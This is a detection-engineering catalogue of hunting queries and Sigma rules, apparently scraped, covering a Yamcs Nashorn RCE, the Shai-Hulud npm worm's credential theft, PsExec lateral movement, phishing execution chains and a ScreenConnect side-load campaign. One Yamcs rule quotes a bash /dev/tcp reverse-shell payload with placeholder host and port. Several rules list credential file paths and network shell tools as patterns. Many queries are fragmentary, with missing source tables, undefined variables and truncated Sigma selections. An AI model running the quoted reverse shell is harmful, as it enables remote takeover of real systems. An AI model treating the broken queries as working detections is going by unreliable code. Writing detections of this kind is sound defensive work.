// TVM tables are daily snapshots — pin a 1-day window so the engine
// partitions on Timestamp instead of scanning the full retention.
DeviceTvmSoftwareVulnerabilities
| where Timestamp > ago(1d)
| where CveId in~ ("CVE-2026-46621")
| join kind=inner (DeviceInfo | where Timestamp > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId, VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

// Sentinel has no native TVM table. If MDE→Sentinel streaming is enabled,
// `DeviceTvmSoftwareVulnerabilities` is available. Otherwise this UC has
// no Sentinel translation — track via Update / Heartbeat OS-version
// gaps as a coarse approximation.
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(1d)
| where CveId in~ ("CVE-2026-46621")
| join kind=inner (DeviceInfo | where TimeGenerated > ago(1d)) on DeviceId
| project DeviceName, OSPlatform, CveId,
          VulnerabilitySeverityLevel, RecommendedSecurityUpdate
| order by VulnerabilitySeverityLevel asc, DeviceName asc

psexec / paexec / smbexec / wmic /node — service install over SMB from remote host.

| where Timestamp > ago(7d)
| where AccountName !endswith "$"
| where FileName in~ ("psexec.exe","psexesvc.exe","paexec.exe","smbexec.py")

title: PsExec / SMB Lateral Movement Tooling Execution
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d03
status: experimental
description: |

[LLM] Yamcs MdbOverrideApi algorithm PATCH carrying Nashorn Java.type RCE payload Exploitation High
Detects HTTP PATCH requests to the Yamcs algorithm-override endpoint where the JSON body contains Nashorn escape sequences that reach `java.lang.Runtime` — the exact CVE-2026-46562 exploit shape. Targets the request hitting any reverse proxy / WAF / web log in front of Yamcs (default port 8090). Rationale: Exploits ride the article's exact endpoint shape `PATCH /api/mdb-overrides/{instance}/{processor}/algorithms/{name*}` and require Nashorn pivot tokens (`Java.type`, `java.lang.Runtime`, `getRuntime`) in the JSON body — both are dead-giveaway strings called out in the GHSA advisory body. Legacy `5.5.0` path `/api/mdb/.../algorithms/` is also covered. No external corroboration available — advisory is sole source as of 2026-05-28.
ATT&CKT1190 T1059.007
Data sourcesWeb.Web
// Defender Advanced Hunting has no HTTP request-body table for Yamcs front-end logs; closest pivot is inbound TCP to port 8090 followed by java spawning a shell. See UC2/UC3 for the post-exploitation half.
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where ActionType == "InboundConnectionAccepted"
| where LocalPort == 8090
| where InitiatingProcessFileName has_any ("java","java.exe")
| project Timestamp, DeviceName, RemoteIP, RemotePort, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
let YamcsExploitTokens = dynamic(["Java.type","java.lang.Runtime","getRuntime","ProcessBuilder","/dev/tcp/"]);
CommonSecurityLog
| where TimeGenerated > ago(7d)
| where RequestMethod =~ "PATCH"
| where RequestURL matches regex @"(?i)/api/mdb-overrides/[^/]+/[^/]+/algorithms/"
| where Message has_any (YamcsExploitTokens) or RequestContext has_any (YamcsExploitTokens) or AdditionalExtensions has_any (YamcsExploitTokens)
| project TimeGenerated, SourceIP, DestinationIP, DestinationPort, RequestMethod, RequestURL, RequestClientApplication, Message, DeviceVendor, DeviceProduct
| order by TimeGenerated desc

[LLM] Yamcs JVM spawning a POSIX shell — Nashorn Runtime.exec post-exploitation Installation High
Detects the Yamcs `java` process (yamcs-core JVM) directly spawning `/bin/sh`, `/bin/bash`, `dash`, or `nc` — a behaviour that never occurs in legitimate Yamcs operation. This is the immediate child-process side of the CVE-2026-46562 Nashorn RCE primitive `Java.type("java.lang.Runtime").getRuntime().exec(...)`. Rationale: Article's PoC literally runs `Java.type("java.lang.Runtime").getRuntime().exec(["bash","-c","..."])`. The unique high-fidelity signal is `java` (with `yamcs`/`org.yamcs` in its cmdline so we scope to the Yamcs JVM specifically, not arbitrary Java apps) directly forking a shell — yamcs-core itself never does this in normal operation. No external corroboration available (GHSA is sole source).
ATT&CKT1059.004 T1190

| where FileName in~ ("sh","bash","dash","zsh","nc","ncat","socat","python","python3","perl","ruby")
| project Timestamp, DeviceName, AccountName,
          ParentImage = InitiatingProcessFolderPath,
          ParentCmd   = InitiatingProcessCommandLine,
          ChildImage  = FolderPath,
          ChildCmd    = ProcessCommandLine,
          SHA256
| order by Timestamp desc
ImProcessCreate

| where ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| where ActingProcessName has_any ("/sh","/bash","/dash","/zsh","/nc","/ncat","/socat","/python","/python3","/perl")
   or TargetProcessName has_any ("sh","bash","dash","nc","ncat","socat","python","python3","perl")
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine, TargetProcessName, TargetProcessCommandLine
| order by TimeGenerated desc

[LLM] Reverse-shell /dev/tcp file descriptor from Yamcs java process tree Command & Control High
Detects the bash `exec 3<>/dev/tcp/HOST/PORT` reverse-shell file-descriptor primitive when it descends from the Yamcs JVM. This is the *exact* payload string in the CVE-2026-46562 PoC and catches the post-exploitation network pivot whether or not UC2 caught the initial spawn. Rationale: Verbatim from the GHSA PoC body: `["bash","-c","exec 3<>/dev/tcp/${LHOST}/${LPORT}; id >&3; sh -i <&3 >&3 2>&3"]`. The `/dev/tcp/` token is unique to bash-builtin reverse shells (no legitimate Yamcs subroutine writes to that pseudo-path), and constraining the parent chain to the Yamcs JVM cuts the broad LFI-style FPs that pure `/dev/tcp/` rules suffer. No external corroboration available (advisory is sole public source).
ATT&CKT1059.004 T1071.001 T1219
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(7d)
| where ProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where FileName in~ ("bash","sh","dash","zsh")
| where InitiatingProcessFileName =~ "java"
   or InitiatingProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
   or InitiatingProcessParentFileName =~ "java"
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, ProcessCommandLine)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, ProcessCommandLine)
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, RevHost, RevPort,
          ParentImage = InitiatingProcessFolderPath, ParentCmd = InitiatingProcessCommandLine
| order by Timestamp desc
ImProcessCreate
| where TimeGenerated > ago(7d)
| where ActingProcessCommandLine has_any ("/dev/tcp/","/dev/udp/") or TargetProcessCommandLine has_any ("/dev/tcp/","/dev/udp/")
| where (ParentProcessName endswith "/java" or ParentProcessName =~ "java")
   or ParentProcessCommandLine has_any ("yamcs","org.yamcs","yamcs-core")
| extend Cmd = coalesce(ActingProcessCommandLine, TargetProcessCommandLine)
| extend RevHost = extract(@"/dev/(?:tcp|udp)/([^/\s]+)/\d+", 1, Cmd)
| extend RevPort = extract(@"/dev/(?:tcp|udp)/[^/\s]+/(\d+)", 1, Cmd)
| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, Cmd, RevHost, RevPort
| order by TimeGenerated desc

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget · Office app spawning script/LOLBin child process · Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) · [LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration
Command & Control. Beacon to attacker infrastructure for control and tasking. → Beaconing — periodic outbound to small set of destinations
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo · OAuth consent / suspicious app grant · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft) · Remote service execution — PsExec / SMB lateral movement
[LLM] Shai-Hulud npm postinstall reads cloud credential files (~/.aws, ~/.ssh, ~/.kube, gcloud ADC) Installation High
Hunts the Shai-Hulud worm's secret-harvesting stage: a node/npm/yarn process opens AWS credentials, SSH private keys, Kubernetes kubeconfig, or GCP application-default-credentials. The article confirms TGR-CRI-1135 released an open-source version on 2026-05-13, so copycats will reuse this file-access pattern. Rationale: Article confirms TGR-CRI-1135's malware exfiltrates 'cloud access tokens, SSH keys, Kubernetes secrets' and announced the open-source Shai-Hulud release 2026-05-13. Datadog Security Labs and Unit 42 follow-up writeups confirm the exact filesystem paths (~/.aws/credentials, ~/.ssh/, ~/.kube/config, application_default_credentials.json) and that node is the executing host — making this a precise file-access pivot, not a generic 'credentials in files' rule. Cross-checked against: • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/ • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised
ATT&CKT1552.001 T1195.002 T1528

| where ActionType in ("FileCreated","FileModified","FileRenamed","FileAccessed")
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FolderPath, FileName, ActionType, SHA256
| order by Timestamp desc
ImFileEvent

| where ActorUsername !endswith "$"
| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, TargetFilePath, EventType
| order by TimeGenerated desc

status: experimental
description: Detects node/npm/yarn/pnpm processes accessing AWS, SSH, Kubernetes or GCP credential files — the Shai-Hulud worm's credential-harvest stage. TGR-CRI-1135 open-sourced the tool 2026-05-13.
references:
  - https://unit42.paloaltonetworks.com/cyber-extortion-economy/
  - https://unit42.paloaltonetworks.com/npm-supply-chain-attack/
  - https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/

date: 2026/05/28
tags:

logsource:
  category: file_access
  product: windows
detection:
  selection_proc:
    Image|endswith:
      - '\node.exe'
      - '\npm.exe'
      - '\yarn.exe'
      - '\pnpm.exe'
  selection_file:
    TargetFilename|contains:
      - '\.aws\credentials'
      - '\.ssh\id_rsa'
      - '\.ssh\id_ed25519'
      - '\.kube\config'
      - 'application_default_credentials.json'
      - '\gcloud\credentials.db'
  condition: selection_proc and selection_file
falsepositives:
  - Legitimate IaC tooling (terraform-wrapped node helpers, cdktf) reading AWS profile
  - Developer-machine kube/aws CLI plugin that legitimately shells out to node
level: high
source:windows.sysmon @EventID:11 @Image:(*\node.exe OR *\Node.exe OR *\NODE.EXE OR *\npm.exe OR *\NPM.EXE OR *\yarn.exe OR *\YARN.EXE OR *\pnpm.exe) @TargetFilename:(*\.aws\credentials OR *\.ssh\id_rsa* OR *\.ssh\id_ed25519* OR *\.kube\config OR *application_default_credentials.json OR *\gcloud\credentials.db)
#event_simpleName=FileOpenInfo ContextImageFileName=/\\(node|npm|yarn|pnpm)\.exe$/i
| regex("(\\\\\\.aws\\\\credentials|\\\\\\.ssh\\\\id_(rsa|ed25519|ecdsa)|\\\\\\.kube\\\\config|application_default_credentials\\.json|\\\\gcloud\\\\credentials\\.db)", field=TargetFileName)
| groupBy([aid, ComputerName, ContextImageFileName, TargetFileName], function=count())
| _count > 0

[LLM] Shai-Hulud exfiltration: node.exe POSTs to api.github.com creating public repo Actions on Objectives Medium
Detects the Shai-Hulud worm's exfiltration channel — a node/npm process making API calls to api.github.com on a non-developer host (or burst of repo-creation API traffic). The worm dumps stolen secrets into a newly-created public GitHub repo tagged 'Sha1-Hulud: The Second Coming'. Rationale: Article ties TGR-CRI-1135 (Shai-Hulud author) to the open-source release on 2026-05-13. Datadog Security Labs and Unit 42 confirm exfil channel is a public GitHub repo created via api.github.com — pairing the credential-file read (UC1) with an outbound github.com call from the same node PID inside 10 minutes is high-fidelity vs background developer noise. Cross-checked against: • https://securitylabs.datadoghq.com/articles/shai-hulud-2.0-npm-worm/ • https://www.upwind.io/feed/shai-hulud-2-npm-supply-chain-worm-attack • https://unit42.paloaltonetworks.com/npm-supply-chain-attack/

[LLM] Bling Libra: Entra device join immediately after vishing-driven MFA registration Installation High
Detects Bling Libra's (ShinyHunters / UNC6040) post-vishing persistence pattern — within minutes of a successful interactive sign-in from a new location/IP, the same identity registers a new device (and frequently a new MFA method) on Entra ID. The article confirms the playbook is unchanged: vishing → credential+MFA intercept → register own device for persistence. Rationale: Article states Bling Libra 'continues to use vishing for initial access… and ultimately registering their own devices to establish persistence within targeted environments.' Mandiant/Google Cloud and BankInfoSecurity writeups confirm device-registration-within-30-minutes-of-suspicious-sign-in as the high-fidelity correlation. The temporal join is what distinguishes attacker registration from a user's own new laptop enrollment. Cross-checked against: • https://cloud.google.com/blog/topics/threat-intelligence/defense-against-shinyhunters-cybercrime-saas • https://cloud.google.com/blog/topics/threat-intelligence/expansion-shinyhunters-saas-data-theft • https://www.bankinfosecurity.com/hanging-up-on-shinyhunters-experts-detail-vishing-defenses-a-30657

[LLM] Hazy Scorpius (CL0P) Oracle EBS exploitation via CVE-2025-61882 — concurrent processing spawns shell/wget Exploitation High
Hunts the post-exploit footprint of CVE-2025-61882 in Oracle E-Business Suite (Concurrent Processing) — the Java app-server process (java/oracle) spawning OS shells, wget, curl, perl or python is the canonical Cl0p webshell-drop pattern observed by Mandiant/Google Cloud against EBS 12.2.x. Rationale: Article names CVE-2025-61882 as Hazy Scorpius/CL0P's vector into Oracle EBS. Google Cloud TI and Oracle's own advisory confirm Cl0p drops Java/JSP webshells via the Concurrent Processing component; java/FNDLIBR spawning a shell/downloader on an EBS host is the cleanest live-exploit pivot. Filter for EBS-specific paths (appsutil, FMW_Home, comn/util) keeps this scoped to actual EBS servers. Cross-checked against: • https://www.oracle.com/security-alerts/alert-cve-2025-61882.html • https://cloud.google.com/blog/topics/threat-intelligence/oracle-ebusiness-suite-zero-day-exploitation • https://www.tenable.com/blog/cve-2025-61882-faq-oracle-e-business-suite-zero-day-cl0p-and-july-2025-cpu • https://www.rapid7.com/blog/post/etr-cve-2025-61882-critical-0day-in-oracle-e-business-suite-exploited-in-the-wild/

      - '/python3'
      - '/nc'
      - '/ncat'
  filter_legit:
    CommandLine|contains:
      - 'adstrtal'
      - 'adstpall'
      - 'adcfgclone'
  condition: selection_parent and selection_child and not filter_legit
falsepositives:
  - Oracle EBS patching (autoconfig, adop) which legitimately spawns shells under java
  - Administrative concurrent programs that shell out by design
level: high
source:linux.auditd @auditd.type:EXECVE @process.parent.executable.path:(*/java OR */FNDLIBR OR */httpd) @process.executable.path:(*/sh OR */bash OR */ksh OR */wget OR */curl OR */perl OR */python OR */python3 OR */nc OR */ncat) -@process.command_line:(*adstrtal* OR *adstpall* OR *adcfgclone*)
#event_simpleName=ProcessRollup2 ParentBaseFileName=/^(java|FNDLIBR|httpd)$/i
| regex("(oracle|EBS|fs_inst|appsutil|FMW_Home|comn/util|Concurrent)", field=ParentImageFileName)
| ImageFileName=/\/(sh|bash|ksh|zsh|wget|curl|perl|python3?|nc|ncat)$|\\(cmd|powershell|pwsh|certutil)\.exe$/i
| NOT (regex("(adstrtal|adstpall|adcfgclone)", field=CommandLine))
| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())

Data sourcesNetwork_Traffic.All_Traffic DeviceNetworkEvents
DeviceNetworkEvents
| where Timestamp > ago(1d)
| where RemoteIPType == "Public" and ActionType == "ConnectionSuccess"
| project DeviceName, RemoteIP, RemotePort, Timestamp
| sort by DeviceName asc, RemoteIP asc, RemotePort asc, Timestamp asc
| extend prev_dev = prev(DeviceName, 1), prev_ip = prev(RemoteIP, 1),
         prev_port = prev(RemotePort, 1), prev_ts = prev(Timestamp, 1)
| where DeviceName == prev_dev and RemoteIP == prev_ip and RemotePort == prev_port

| summarize conn_count = count(), avg_delta = avg(delta_sec), stdev_delta = stdev(delta_sec)

| order by conn_count desc

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats summariesonly=false earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time
Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Office Application Spawning Script Host
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d07

    object payload signature.
references:
    - https://attack.mitre.org/techniques/T1059/
    - https://attack.mitre.org/techniques/T1566/001/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1059
    - attack.t1566.001
    - attack.execution
logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:

            - '\powerpnt.exe'
            - '\outlook.exe'
            - '\onenote.exe'
            - '\mspub.exe'

            - '\pwsh.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\mshta.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'

      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("winword.exe","excel.exe","powerpnt.exe","outlook.exe","onenote.exe","mspub.exe","visio.exe")
      AND Processes.process_name IN ("cmd.exe","powershell.exe","pwsh.exe","wscript.exe","cscript.exe","mshta.exe","rundll32.exe","regsvr32.exe","wmic.exe","bitsadmin.exe","certutil.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process

[LLM] ZIP download from gleeze.com subdomain triggered by browser/AI-chatbot click Delivery High
Catches the SEO-poisoning / chatbot-recommendation delivery stage by alerting on ZIP archives fetched from gleeze.com (or any *.gleeze.com subdomain such as minemine.gleeze.com / zoneimport.g3639.gleeze.com) into a user-writable directory by a browser. Article-specific because the campaign reuses this single staging domain across every fake utility lure (CrystalDiskInfo, HWMonitor, DDU, FurMark, K-Lite, PDFgear). Rationale: gleeze.com is the single confirmed staging domain in the article; combined with a browser writing a ZIP/MSI/EXE it's a near-binary indicator of the drive-by lure. Article filenames (CrystalDiskInfo etc.) are added as an enrichment column rather than a hard filter to keep coverage when the actor rotates lures.
ATT&CKT1189 T1566.002 T1608.006

| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| extend MatchedLure = iif(FileName has_any (LureNames), "yes", "no")
| project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, FileName, FolderPath, FileOriginUrl, FileOriginReferrerUrl, InitiatingProcessFileName, MatchedLure
| order by Timestamp desc

ImWebSession

| where Url endswith ".zip" or Url endswith ".msi" or Url endswith ".exe"

[LLM] DLL side-load utility spawning msiexec to install vcredist_x64.dll (ScreenConnect drop) Installation High
Detects the campaign's signature install chain: a benign-named utility (CrystalDiskInfo/HWMonitor/DDU/FurMark/etc.) loads a side-loaded DLL that then spawns msiexec.exe to install a file literally named vcredist_x64.dll which is actually the ScreenConnect package. The msiexec parent + vcredist_x64.dll target is the hard tell — Microsoft Visual C++ Redistributable is an MSI, never a DLL passed to msiexec. Rationale: vcredist_x64.dll passed to msiexec is a contradiction — VCRedist ships as MSI/EXE, never a DLL. Combined with the parent being one of the article's named lure utilities, this is article-specific and exceedingly rare in benign environments.
ATT&CKT1574.002 T1218.007 T1219
Data sourcesEndpoint.Processes
let LureBins = dynamic(["DiskInfo64.exe","DiskInfo32.exe","DiskMark64.exe","HWMonitor.exe","DDU.exe","DisplayDriverUninstaller.exe","FurMark.exe","K-Lite_Codec_Pack.exe","PDFgear.exe"]);
DeviceProcessEvents
| where Timestamp > ago(14d)
| where FileName =~ "msiexec.exe"
| where ProcessCommandLine has "vcredist_x64.dll"
| extend SideLoaderHit = iif(InitiatingProcessFileName has_any (LureBins), "matched", "unmatched")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessFolderPath, InitiatingProcessCommandLine, SideLoaderHit
| order by Timestamp desc
let LureBins = dynamic(["DiskInfo64.exe","DiskInfo32.exe","DiskMark64.exe","HWMonitor.exe","DDU.exe","DisplayDriverUninstaller.exe","FurMark.exe","K-Lite_Codec_Pack.exe","PDFgear.exe"]);
SecurityEvent
| where TimeGenerated > ago(14d)
| where EventID == 4688
| where NewProcessName endswith @"\msiexec.exe"
| where CommandLine has "vcredist_x64.dll"
| extend SideLoaderHit = iif(ParentProcessName has_any (LureBins), "matched", "unmatched")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName, SideLoaderHit
| order by TimeGenerated desc

[LLM] Microsoft-signed .NET utility (InstallUtil/RegAsm/MSBuild/AppLaunch/...) initiated by RuntimeHost/SimpleRunPE/vlc.exe Installation High
